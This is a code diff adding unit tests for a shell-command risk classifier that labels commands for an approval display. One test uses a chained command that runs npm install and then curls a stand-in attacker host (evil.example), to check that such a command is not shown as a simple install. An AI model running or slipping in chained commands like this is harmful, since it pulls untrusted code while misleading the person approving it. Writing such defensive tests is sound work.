@@ -90,6 +90,23 @@ class ShellRiskTests(unittest.TestCase):
         self.assertEqual(risk.label, "generic")
         self.assertIn("exit code", risk.post_approval_instructions)
 
+    def test_approval_card_unwrap_and_pip_prefix(self) -> None:
+        cases = {
+            'pwsh -c "  git   push"': "publish",
+            "cmd /c npm install": "dependency_install",
+            "py -X utf8 -m pip install requests": "dependency_install",
+        }
+        for command, label in cases.items():
+            with self.subTest(command=command):
+                self.assertEqual(classify_shell_risk(command).label, label)
+
+    def test_chained_command_stays_generic(self) -> None:
+        # Display-only safety: a chained install + download must not be
+        # described as a single-purpose install.
+        risk = classify_shell_risk('powershell "npm install; curl https://evil.example/x"')
+
+        self.assertEqual(risk.label, "generic")
+
 
 if __name__ == "__main__":
     unittest.main()
